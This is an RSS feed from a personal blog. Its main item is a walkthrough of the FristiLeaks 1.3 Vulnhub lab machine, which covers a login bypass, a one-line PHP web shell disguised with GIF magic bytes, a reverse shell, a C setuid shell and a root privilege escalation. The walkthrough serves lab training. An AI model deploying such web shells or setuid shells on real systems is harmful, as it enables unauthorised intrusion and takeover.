<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Barvent</title>
    <description>Barvent's technology blog
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Wed, 01 Jul 2020 12:43:59 -0400</pubDate>
    <lastBuildDate>Wed, 01 Jul 2020 12:43:59 -0400</lastBuildDate>
    <generator>Jekyll v4.1.1</generator>
    
      <item>
        <title>FristiLeaks 1.3 Write-Up</title>
        <description>&lt;p&gt;FristiLeaks is an easy OSCP-like boot to root VM hosted on Vulnhub. The goal in this challenge is to obtain root in the box and read the flag.&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port Scan&lt;/h1&gt;
&lt;p&gt;Normally, the first thing to do when dealing with Vulnhub machines is to scan the network (I use Nmap to do so) to find the IP of the vulnerable machine, 
but in this case the machine tells us its IP in the login prompt. 
&lt;br /&gt;
&lt;img src=&quot;allPortsScan.png&quot; alt=&quot;Port scan result&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the scan we can see that the only open port is 80, which usually is HTTP.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Port 80 Initial Enumeration&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;port80Nmap.png&quot; alt=&quot;Nmap output for port 80&quot; /&gt;
In the Nmap output for port 80 using the default scripts we can see that robots.txt has three disallowed entries. Also, we can see that the webserver uses 
Apache httpd 2.2.15, PHP version 5.3.3 and the distribution is CentOS.
&lt;br /&gt;&lt;br /&gt;
The root page of the web has nothing interesting at first glance, but there is this image which will be useful later.
&lt;img src=&quot;KeepCalm.png&quot; alt=&quot;KeepCalm&quot; /&gt;
Also, inside of the robots.txt file we can see the three disallowed entries.
&lt;img src=&quot;robots.png&quot; alt=&quot;Robots file&quot; /&gt;
All the disallowed entries have the same image saying “This is not the URL you were looking for” (I didn’t get a screenshot of this). 
At this point I wasn’t sure about what to do, as I didn’t find any interesting vulnerabilities for the server and neither did both Nikto and gobuster.
&lt;br /&gt;
Using a bit of guess work I found the directory fristi. All the entries in the robots.txt are drinks and, according to the image, fristi is also a drink. Maybe using a 
wordlist generated by CEWL and gobuster you can find the directory, but I didn’t think about this when I was enumerating the box.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Fristi Directory&lt;/h1&gt;
&lt;p&gt;The index.php file of this directory is a login page which isn’t vulnerable to SQLInjection (or at least I couldn’t find it), but I found two different ways to
“bypass” it.&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;First Method&lt;/h2&gt;
&lt;p&gt;In the source code we can see some interesting comments.
&lt;img src=&quot;fristiCom0.png&quot; alt=&quot;First commentary&quot; /&gt; 
&lt;img src=&quot;fristiCom1.png&quot; alt=&quot;Second commentary&quot; /&gt;
&lt;img src=&quot;fristiCom2.png&quot; alt=&quot;Third commentary&quot; /&gt;
We get a possible username (eezeepz) inside of the first commentary and a base64 encoded image. If we decode it we can see that it is a PNG image.
&lt;img src=&quot;decodeFristiImg.png&quot; alt=&quot;Decoding&quot; /&gt;
&lt;img src=&quot;decodedFristiImg.png&quot; alt=&quot;Decoded&quot; /&gt;
Here we can guess that the user “eezeepz” has the password “keKkeKKeKKeKkEkkEk”. A successful login redirects us to the “upload.php” page.
&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;Second Method&lt;/h2&gt;
&lt;p&gt;Using gobuster with the .php extension we can find the “uploads” directory, which hasn’t directory listing activated and “upload.php”, which redirects us to the login page.
&lt;br /&gt;
Intercepting the request to “upload.php” using BurpSuite we can see that there is more content below the redirection. If we rewrite the status code (302 FOUND) to 200 OK, we can see the upload page without knowing the credentials.
&lt;img src=&quot;burpIntercept.png&quot; alt=&quot;BurpSuite request interception&quot; /&gt; 
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;File Upload + RCE&lt;/h1&gt;
&lt;p&gt;The page only allows uploading images, but it can be bypassed easily. You just need to change the &lt;a href=&quot;https://en.wikipedia.org/wiki/List_of_file_signatures&quot;&gt;magic bytes&lt;/a&gt; to something that will be detected as an image, as well as using the correct extension.
&lt;br /&gt;
I didn’t try using the correct extension without changing the magic bytes, but it probably doesn’t work. In my case, I used GIF87a as the magic bytes and created a really simple php shell to test if the RCE was possible.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;GIF87a
#The echo is redundant, as system prints the output of the command executed.
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;uploadShell.png&quot; alt=&quot;Uploading of the shell&quot; /&gt;
&lt;img src=&quot;correctUpload.png&quot; alt=&quot;Correct upload&quot; /&gt;
This shell works pretty well, but it can’t execute commands that need arguments (strangely, it works fine in my machine, hosting the shell using php -S localhost:8000).
&lt;br /&gt;
To use it you just need to pass the command inside the cmd argument, it accepts both GET and POST requests. In my case, I executed the whoami command.
&lt;img src=&quot;simpleRCE.png&quot; alt=&quot;Code execution&quot; /&gt;
After I checked that the simple shell really worked, I uploaded a php reverse shell (the one inside /usr/share/webshells/php/php-reverse-shell.php on Kali) and set a listener on port 1234.
&lt;img src=&quot;revShell.png&quot; alt=&quot;Reverse shell&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Apache Shell&lt;/h1&gt;
&lt;p&gt;The first thing I did was upgrading the shell to a &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/upgrade-dumb-shell-fully-interactive-shell-for-more-flexibility-0197224/&quot;&gt;more functional one&lt;/a&gt;.
&lt;img src=&quot;upgradingShell.png&quot; alt=&quot;Shell upgrade&quot; /&gt;
Inside the “checklogin.php” file we can get the hardcoded mysql credentials, but we can only read the username and the password required to access the “upload.php” page.
&lt;img src=&quot;mysqlCreds.png&quot; alt=&quot;Creds&quot; /&gt;
Inside the file located at “/var/www/notes.txt” there is an interesting message.
&lt;img src=&quot;notes1.png&quot; alt=&quot;Notes.txt 1&quot; /&gt;
If we go to the “/home/eezeepz” directory we can see lots of uninteresting files and another notes.txt.
&lt;img src=&quot;notes2.png&quot; alt=&quot;Notes.txt 2&quot; /&gt;
Essentially this is saying that we can run commands as another user. I found two ways to exploit this, but I only used the easiest as the other one was too time consuming.&lt;/p&gt;
&lt;h2&gt;First Method (not used)&lt;/h2&gt;
&lt;p&gt;Looking inside the “/usr/bin/” directory we can see the gcc binary, so I created a pretty simple C shell that uses the “setuid()” system call to run as another user.&lt;br /&gt;
My idea is to upload the file to the box (using the http.server module in python3 to serve the file), make the other user compile the shell and setting the SetUID bit, as well as giving execute permissions to others.&lt;br /&gt;
The shell that I used was really simple for the sake of saving time, but I could have used a more interactive shell if it was necessary.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Usage: ./shell &amp;lt;command&amp;gt; &amp;lt;uid&amp;gt;  (no arguments for the command)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;atoi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Setuid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;perror&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Error executing command&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Inside the “/tmp/runthis” file I wrote the necessary commands to do this and I read the uid from the “/etc/passwd” file, which I’m not including because it’s too large.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/usr/bin/gcc /tmp/shell.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /tmp/shell
/home/admin/chmod u+s /tmp/shell
/home/admin/chmod o+x /tmp/shell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;shellPermission.png&quot; alt=&quot;Shell permissions&quot; /&gt;
&lt;img src=&quot;shellExecution.png&quot; alt=&quot;Execution&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h2&gt;Second Method + PrivEsc&lt;/h2&gt;
&lt;p&gt;We can read the “/home/admin/” directory if we change the permissions using the “/tmp/runit” file and the chmod command.&lt;br /&gt;
Inside this directory there are two seemingly encrypted files (cryptedpass.txt and whoisyourgodnow.txt) and a python script which encrypts them (I didn’t take a screenshot of this, I don’t know why).
&lt;br /&gt;
The python script only base64 encodes the supplied password, then it reverses it and finally it encrypts it using the ROT13 method. If we reverse these steps, we can read the plaintext password.
&lt;img src=&quot;cryptedPass.png&quot; alt=&quot;Crypted pass&quot; /&gt;
&lt;img src=&quot;whogodPass.png&quot; alt=&quot;Whogod pass&quot; /&gt;
The first picture has the unencrypted text inside of “cyptedpass.txt”, while the second has the text inside “whoisyourgodnow.txt”.&lt;br /&gt;
LetThereBeFristi! (inside whoisyourgodnow.txt) is the password for the fristigod user.
&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Root PrivEsc&lt;/h1&gt;
&lt;p&gt;Executing the “sudo -l” command as user fristigod and supplying the “LetThereBeFristi!” password outputs this:
&lt;img src=&quot;sudoL.png&quot; alt=&quot;sudo -l output&quot; /&gt;
And if we check the “/var/fristigod/.secret_admin_stuff/” we can see that the doCom binary has the SetUid bit and is owned by root.
&lt;img src=&quot;ls_fristigod.png&quot; alt=&quot;ls /var/fristigod/.secret_admin_stuff/&quot; /&gt;
Using the “sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom” command we can check the usage of this binary, which allows us to run commands as root.
&lt;br /&gt;
Running the “/bin/bash” command grants us an interactive shell as root and then we can read the flag inside “/root/fristileaks_secrets.txt”.
&lt;img src=&quot;rootPrivEsc.png&quot; alt=&quot;Root privesc&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This is a fairly easy box, although I got stucked for while at the first part because I didn’t guess that fristi was the correct directory.
&lt;br /&gt;
I’ve learnt how to use the setuid() system call, which I think is pretty useful and that I need to take more screenshots before reporting.&lt;/p&gt;
</description>
        <pubDate>Sun, 28 Jun 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/fristileaks_1.3_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/fristileaks_1.3_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Hello World!</title>
        <description>&lt;p&gt;Welcome to my blog!
&lt;br /&gt;
This is my first post, which is going to help me test if the blog works correctly and check if I’m using the categories correctly. 
&lt;br /&gt;
Soon I’ll post more content, mainly write-ups about some &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot;&gt;OSCP like machines from Vulnhub&lt;/a&gt;, but maybe I’ll post about my projects or other tech related topics.&lt;/p&gt;
</description>
        <pubDate>Fri, 26 Jun 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/misc/hello_world/</link>
        <guid isPermaLink="true">http://localhost:4000/misc/hello_world/</guid>
        
        
        <category>misc</category>
        
      </item>
    
  </channel>
</rss>
